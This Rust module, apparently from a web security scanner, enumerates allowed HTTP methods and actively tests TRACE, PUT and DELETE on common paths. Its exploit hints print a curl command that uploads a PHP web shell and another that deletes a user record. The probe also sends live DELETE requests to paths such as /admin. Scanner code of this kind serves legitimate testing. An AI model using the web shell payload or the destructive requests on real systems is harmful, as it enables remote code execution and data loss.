//! HTTP method enumeration probe.
//!
//! Sends OPTIONS to discover allowed methods, then actively verifies
//! dangerous ones (PUT, DELETE, PATCH, TRACE) on common paths.
//!
//! Findings:
//!   PUT enabled   → potential arbitrary file write / RCE
//!   DELETE enabled → data destruction without auth
//!   TRACE enabled  → cross-site tracing (XST) — credential theft via XSS
//!   PATCH enabled  → partial update bypass (check auth separately)

use gossan_core::Target;
use reqwest::Client;
use secfinding::{Evidence, Finding, Severity};

// Paths to probe — mix of root, API, upload, and static paths
const PROBE_PATHS: &[&str] = &[
    "/",
    "/api",
    "/api/v1",
    "/upload",
    "/files",
    "/data",
    "/api/v1/users",
    "/api/v1/files",
    "/admin",
];

pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Finding>> {
    let Target::Web(asset) = target else {
        return Ok(vec![]);
    };
    let base = asset.url.as_str().trim_end_matches('/');
    let mut findings = Vec::new();

    // Track which dangerous methods we've already reported (avoid spam)
    let mut reported_put = false;
    let mut reported_delete = false;
    let mut reported_trace = false;

    for path in PROBE_PATHS {
        let url = format!("{}{}", base, path);

        // OPTIONS request — server declares what it allows
        let options_allow =
            if let Ok(resp) = client.request(reqwest::Method::OPTIONS, &url).send().await {
                resp.headers()
                    .get("allow")
                    .or_else(|| resp.headers().get("access-control-allow-methods"))
                    .and_then(|v| v.to_str().ok())
                    .map(|s| s.to_uppercase())
                    .unwrap_or_default()
            } else {
                String::new()
            };

        // ── TRACE ──────────────────────────────────────────────────────────
        if !reported_trace && (options_allow.contains("TRACE") || *path == "/") {
            if let Ok(resp) = client
                .request(reqwest::Method::TRACE, &url)
                .header("X-Gossan-Probe", "xst-test")
                .send()
                .await
            {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                // TRACE echoes the request back — look for our marker or TRACE keyword
                if (200..=299).contains(&status)
                    && (body.contains("X-Gossan-Probe") || body.to_uppercase().contains("TRACE"))
                {
                    reported_trace = true;
                    findings.push(
                        crate::finding_builder(
                            target,
                            Severity::Low,
                            "HTTP TRACE method enabled — cross-site tracing (XST)",
                            format!(
                                "{} responds to TRACE with HTTP {}. \
                                     TRACE echoes all request headers including cookies and \
                                     Authorization. Combined with XSS, an attacker can read \
                                     HttpOnly cookies (XST attack). Disable TRACE on the server.",
                                url, status
                            ),
                        )
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone())],
                            body_excerpt: Some(body.chars().take(200).collect()),
                        })
                        .tag("http-method")
                        .tag("xst")
                        .tag("web")
                        .exploit_hint(format!(
                            "curl -s -X TRACE '{}' -H 'Cookie: session=victim_token'",
                            url
                        ))
                        .build()
                        .expect("finding builder: required fields are set"),
                    );
                }
            }
        }

        // ── PUT ────────────────────────────────────────────────────────────
        if !reported_put && options_allow.contains("PUT") {
            // Try to PUT a harmless probe file
            let put_url = format!(
                "{}{}/gossan-method-probe.txt",
                base,
                path.trim_end_matches('/')
            );
            if let Ok(resp) = client
                .request(reqwest::Method::PUT, &put_url)
                .header("content-type", "text/plain")
                .body("gossan-method-probe")
                .send()
                .await
            {
                let status = resp.status().as_u16();
                if matches!(status, 200 | 201 | 204) {
                    reported_put = true;
                    findings.push(
                        crate::finding_builder(target, Severity::Critical,
                            format!("HTTP PUT enabled — arbitrary file write at {}", path),
                            format!("{} accepted an HTTP PUT request (HTTP {}). \
                                     An attacker can upload arbitrary files — including web shells — \
                                     to the server, potentially achieving Remote Code Execution.", put_url, status))
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone())],
                            body_excerpt: None,
                        })
                        .tag("http-method").tag("file-upload").tag("rce")
                        .exploit_hint(format!(
                            "# Upload a web shell:\ncurl -s -X PUT '{}webshell.php' \\\n  \
                             -H 'Content-Type: application/x-httpd-php' \\\n  \
                             -d '<?php system($_GET[\"cmd\"]); ?>'", &put_url.trim_end_matches("gossan-method-probe.txt")))
                        .build().expect("finding builder: required fields are set")
                    );
                }
            }
        }

        // ── DELETE ─────────────────────────────────────────────────────────
        if !reported_delete && options_allow.contains("DELETE") {
            let del_url = format!("{}{}", base, path);
            if let Ok(resp) = client
                .request(reqwest::Method::DELETE, &del_url)
                .send()
                .await
            {
                let status = resp.status().as_u16();
                // 200/204 = successful delete; 404 = resource not found (but DELETE worked)
                // 405/501 = not really enabled despite OPTIONS claim
                if matches!(status, 200 | 204 | 404) {
                    reported_delete = true;
                    findings.push(
                        crate::finding_builder(target, Severity::High,
                            format!("HTTP DELETE method accepted at {}", path),
                            format!("{} accepted HTTP DELETE (HTTP {}). \
                                     Unauthenticated DELETE on API endpoints allows data destruction — \
                                     bulk record removal, account deletion, or cascading data loss.", del_url, status))
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![("allow".into(), options_allow.clone())],
                            body_excerpt: None,
                        })
                        .tag("http-method").tag("data-destruction").tag("web")
                        .exploit_hint(format!("curl -s -X DELETE '{}/api/v1/users/1'", base))
                        .build().expect("finding builder: required fields are set")
                    );
                }
            }
        }

        if reported_put && reported_delete && reported_trace {
            break;
        }
    }

    Ok(findings)
}
